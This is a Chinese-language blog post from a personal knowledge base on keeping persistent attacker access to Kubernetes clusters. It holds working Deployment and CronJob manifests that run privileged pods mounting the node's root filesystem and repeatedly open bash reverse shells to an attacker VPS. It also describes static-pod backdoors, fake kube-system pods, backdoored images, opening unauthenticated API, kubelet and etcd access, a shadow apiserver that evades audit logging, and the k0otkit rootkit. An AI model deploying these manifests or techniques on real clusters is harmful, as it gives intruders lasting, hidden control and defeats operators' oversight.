<!DOCTYPE html>
<html lang="zh-CN" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>K8s渗透-持久化 | My Hugo Knowledgebase</title>

    <link rel="stylesheet" href="/css/main.css">


      <script src="/js/main.js"></script>


</head>
<body>
  <header>
    <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
  <a href="/" style="font-weight: bold; font-size: 1.2em; text-decoration: none; color: var(--text-color);">My Hugo Knowledgebase</a>
  <button id="theme-toggle" class="theme-toggle" aria-label="Toggle Dark Mode" style="font-size: 0.9em;">
    Theme
  </button>
</div>

  </header>
  <main>
    
  <h1>K8s渗透-持久化</h1>

  
  
  <time datetime="2025-01-01T00:00:00&#43;08:00">January 1, 2025</time>

  <h1 id="k8s渗透-持久化">K8s渗透-持久化</h1>
<blockquote>
<p>文章首发于track安全社区：<a href="https://bbs.zkaq.cn/t/32483.html">K8s渗透入门从零到一</a></p>
</blockquote>
<p>持久化即权限维持，通过持久化在k8s中留下后门，可以在初始访问的入口点丢掉之后仍然保持对k8s的控制权</p>
<h2 id="部署后门容器">部署后门容器</h2>
<p>在拥有了创建pod的权限后，我们就可以创建一个恶意的pod为我们实现权限维持（即在容器中留下shell），并且在pod中留下能控制node的后门（比如挂载node的根目录）</p>
<p>常见方法如下</p>
<h3 id="挂载目录">挂载目录</h3>
<p>向创建的pod中挂载一些用于逃逸的目录，在我的逃逸相关文章详细记录了：<a href="https://www.cnblogs.com/yuy0ung/articles/19054753">K8s渗透-权限提升</a></p>
<p>这里值得一提的是，我们可以使用这个配置：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">restartPolicy</span>: <span style="color:#ae81ff">Always</span>
</span></span></code></pre></div><p>可以让pod在被关闭后重启</p>
<h3 id="使用k8s控制器部署后门容器">使用k8s控制器部署后门容器</h3>
<p>在前面 <a href="">K8s渗透-执行</a> 的文章中，我们部署后门容器的方式是使用yaml文件，而文件中有这样一行：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
</span></span></code></pre></div><p>这代表我们创建的后门容器就是一个单纯的pod，而除此之外还有一类后门是控制器，它能自动创建和控制恶意pod，并且它也基于yaml文件创建，优点是更稳定，其自动创建的pod在被kill后可以被恢复，它的yaml文件格式如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">apps/v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Deployment</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-rev</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">replicas</span>: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">selector</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">matchLabels</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">app</span>: <span style="color:#ae81ff">test-rev</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">template</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">labels</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">app</span>: <span style="color:#ae81ff">test-rev</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">nodeName</span>: <span style="color:#ae81ff">&lt;节点名称&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">containers</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-container</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">image</span>: <span style="color:#ae81ff">ubuntu</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">command</span>: [<span style="color:#e6db74">&#34;/bin/sh&#34;</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">args</span>:
</span></span><span style="display:flex;"><span>          - <span style="color:#e6db74">&#34;-c&#34;</span>
</span></span><span style="display:flex;"><span>          - |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            apt update &amp;&amp; apt install -y bash netcat-openbsd &amp;&amp; \
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            bash -c &#39;while true; do bash -i &gt;&amp; /dev/tcp/&lt;你的vps的公网IP&gt;/2333 0&gt;&amp;1; sleep 60; done&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">volumeMounts</span>:
</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/mnt</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-volume</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">securityContext</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">privileged</span>: <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">volumes</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-volume</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">hostPath</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
</span></span></code></pre></div><p>指定yaml文件即可创建：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757005961855.png" alt="QQ_1757005961855"></p>
<p>可以通过如下命令可以查看我们部署的控制器：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl get deployments
</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757006424193.png" alt="QQ_1757006424193"></p>
<p>通过deployment部署的pod即使被删除也能自动重建：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757006371754.png" alt="QQ_1757006371754"></p>
<p>如果要删除这个控制器，命令如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl delete deployment test-rev
</span></span></code></pre></div><h3 id="cronjob持久化">cronjob持久化</h3>
<p>cronjob的作用类似于linux上的crontab，会创建基于时间间隔重复的调度job</p>
<p>job控制器也是k8s的一种内置控制器，用于运行一个或多个Pod来执行任务，yaml文件格式如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">batch/v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">CronJob</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-rev-cron</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">schedule</span>: <span style="color:#e6db74">&#34;*/1 * * * *&#34;</span>   <span style="color:#75715e"># 每分钟执行一次</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">jobTemplate</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">template</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">nodeName</span>: <span style="color:#ae81ff">&lt;节点名称&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">restartPolicy</span>: <span style="color:#ae81ff">Never</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">containers</span>:
</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-container</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">image</span>: <span style="color:#ae81ff">ubuntu</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">command</span>: [<span style="color:#e6db74">&#34;/bin/sh&#34;</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">args</span>:
</span></span><span style="display:flex;"><span>              - <span style="color:#e6db74">&#34;-c&#34;</span>
</span></span><span style="display:flex;"><span>              - |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                apt update &amp;&amp; apt install -y bash netcat-openbsd &amp;&amp; \
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;你的vps的公网IP&gt;/2333 0&gt;&amp;1&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">volumeMounts</span>:
</span></span><span style="display:flex;"><span>            - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/mnt</span>
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-volume</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">securityContext</span>:
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">privileged</span>: <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">volumes</span>:
</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-volume</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">hostPath</span>:
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
</span></span></code></pre></div><p>创建方法也是一样的：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757130951640.png" alt="QQ_1757130951640"></p>
<p>创建后可以查看是否创建成功：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl --kubeconfig config get cronjob -A
</span></span></code></pre></div><p>创建后就可以每分钟收到一次反弹shell：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757130993297.png" alt="QQ_1757130993297"></p>
<p>删除也很简单：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl delete cronjob test-rev-cron
</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757131261273.png" alt="QQ_1757131261273"></p>
<h2 id="在容器镜像内植入后门">在容器/镜像内植入后门</h2>
<h3 id="容器植入后门">容器植入后门</h3>
<p>这里的即对pod容器进行一些基础的维持，方法和常规linux权限维持相似，可以参考我的这篇文章：<a href="https://www.cnblogs.com/yuy0ung/articles/18591381">linux权限维持</a></p>
<h3 id="向镜像植入后门">向镜像植入后门</h3>
<p>如果获取了私有镜像仓库的控制权限，我们便可以尝试向镜像注入恶意代码，常见的方法是修改dockerfile文件，在里面植入恶意的sh命令</p>
<h2 id="修改核心文件访问权限">修改核心文件访问权限</h2>
<p>当我们获得了master节点的权限后，也可以通过修改apiserver配置文件来修改组件的访问权限，常用方式如下：</p>
<ul>
<li>开启apiserver不安全端口或安全端口匿名访问</li>
<li>配置kubelet 10250端口未授权访问</li>
<li>配置etcd未授权</li>
<li>配置kube proxy apiserver监听其他端口</li>
</ul>
<h2 id="伪装系统pod">伪装系统Pod</h2>
<p>kube-system是k8s系统相关的所有对象组成的命名空间，包含很多用于管理集群的组件：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757144377550.png" alt="QQ_1757144377550"></p>
<p>一般来说这些组件是不会被查看和修改的，所以我们可以在这里面伪造一个系统pod，pod创建的方法和前面一样，只是名字和指定的namespace不同，这里不再赘述</p>
<h2 id="部署静态pod">部署静态pod</h2>
<p>static 是 Kubernetes 里的一种特殊的 Pod，由节点上 kubelet 进行管理。在漏洞利用上有以下几点明显的优势：</p>
<ul>
<li>
<p>仅依赖于 kubelet：Static Pod 仅依赖 kubelet，即使 K8s 的其他组件都奔溃掉线，删除 apiserver，也不影响 Static Pod 的使用，在 Kubernetes 已经是云原生技术事实标准的现在，kubelet 几乎运行与每个容器宿主机节点之上</p>
</li>
<li>
<p>配置目录固定：Static Pod 配置文件写入路径由 kubelet config 的 staticPodPath 配置项管理，默认为  /etc/kubernetes/manifests 或  /etc/kubelet.d/，一般情况不做更改。需要注意的是，不同Kubernetes发行版的默认路径可能有所不同，建议在实际环境中进行确认</p>
</li>
</ul>
<p>我们只需要在配置目录如<code>/etc/kubernetes/manifests</code>中添加恶意pod的yaml文件即可</p>
<p>我们可以查看<code>/etc/systemd/system/kubelet.service.d/10-config.conf</code>中是否有这个配置：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757146611800.png" alt="QQ_1757146611800"></p>
<p>没有配置我们可以手动启动这个配置：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubelet --pod-manifest-path<span style="color:#f92672">=</span>/etc/kubernetes/manifests
</span></span></code></pre></div><p>或在上面截图中的<code>/var/lib/kubelet/config.yaml</code>文件中添加一行：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">staticPodPath</span>: <span style="color:#ae81ff">/etc/kubernetes/manifests</span>
</span></span></code></pre></div><h2 id="创建shadow-apiserver">创建shadow apiserver</h2>
<p>思路是创建一个具有apiserver功能的pod，后续命令可以在这个影子apiserver上进行下发，可以绕过k8s的日志审计，不会被原apiserver记录，更加隐蔽</p>
<p>我们可以使用CDK实现，可以看原wiki：https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>./cdk run k8s-shadow-apiserver default
</span></span></code></pre></div><p>shadow apiserver会开启未授权端口，部署完成后我们可以通过kubectl或cdk的kcurl向shadow apiserver下发请求</p>
<h2 id="k0otkit">k0otkit</h2>
<p>绿盟的阮博男师傅分享了一种k8s内的rootkit技术：https://blog.nsfocus.net/k0otkithack-k8s-in-a-k8s-way/</p>
<p>从攻击者的角度来看，k0otkit利用了多种技术和天然优势：</p>
<ol>
<li>DaemonSet和Secret资源（快速持续反弹、资源分离）</li>
<li>kube-proxy镜像（就地取材）</li>
<li>动态容器注入（高隐蔽性）</li>
<li>Meterpreter（流量加密、持续反弹）</li>
<li>无文件攻击（高隐蔽性）</li>
</ol>
<p>这个rootkit除了用于权限维持以外，在我们获得master节点的cluster-admin权限也可以用来快速获取所有节点shell，具体的使用方法可以参考github：https://github.com/Metarget/k0otkit</p>

  


  </main>
  <footer>
    <p>Copyright 2025. All rights reserved.</p>

  </footer>
</body>
</html>
